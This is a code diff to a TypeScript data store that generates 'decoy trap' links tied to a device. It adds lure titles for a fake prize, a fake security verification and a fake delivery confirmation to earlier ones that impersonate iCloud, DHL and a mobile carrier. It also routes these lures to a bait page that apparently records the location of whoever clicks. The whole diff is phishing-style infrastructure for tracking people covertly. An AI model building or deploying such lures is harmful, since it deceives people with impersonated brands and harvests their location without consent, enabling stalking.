@@ -502,13 +502,21 @@ class HybridStore {
     else if (template === "icloud_alert") baitTitle = "iCloud // Urgent Location Found Verification";
     else if (template === "dhl_delivery") baitTitle = "DHL Express // Package Delivery Tracking Update";
     else if (template === "carrier_sim") baitTitle = "Carrier SIM // Network Provisioning Certificate";
+    else if (template === "prize_claim") baitTitle = "🎁 You've Been Selected — Claim Your Device Reward";
+    else if (template === "device_verify") baitTitle = "🔒 Device Security Verification Required — Action Needed";
+    else if (template === "delivery_confirm") baitTitle = "📦 Package Awaiting Delivery Confirmation — Confirm Now";
+
+    // All three themed templates route through the unified bait page (/bait/[id])
+    // lawful_recovery continues to use /recover/[id]
+    const isThemed = ["prize_claim", "device_verify", "delivery_confirm"].includes(template);
+    const trapUrl = isThemed ? `/bait/${trapId}` : `/recover/${trapId}`;
 
     const newTrap: DecoyTrap = {
       id: trapId,
       device_id: deviceId,
       template,
       bait_title: baitTitle,
-      trap_url: `/recover/${trapId}`,
+      trap_url: trapUrl,
       click_count: 0,
       created_at: new Date().toISOString(),
       captures: []
@@ -520,6 +528,7 @@ class HybridStore {
     }
     return newTrap;
   }
+
 
   recordTrapCapture(trapId: string, captureData: {
     latitude?: number;
